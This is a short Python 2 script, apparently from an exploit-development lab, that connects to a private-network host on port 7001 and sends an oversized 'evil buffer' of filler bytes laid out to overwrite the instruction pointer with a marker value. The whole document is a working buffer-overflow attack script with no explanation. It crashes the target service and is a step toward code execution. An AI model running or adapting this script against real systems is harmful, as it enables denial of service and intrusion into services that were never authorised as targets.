#!/usr/bin/python
import socket

print "\nSending evil buffer..."

buffer = "A" * 2288
eip = "B" * 4 
offset = "C" * 268

input_buffer = buffer + eip + offset

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

s.connect(("192.168.199.10", 7001))
s.send(input_buffer)

s.close()

print "\nDone!"
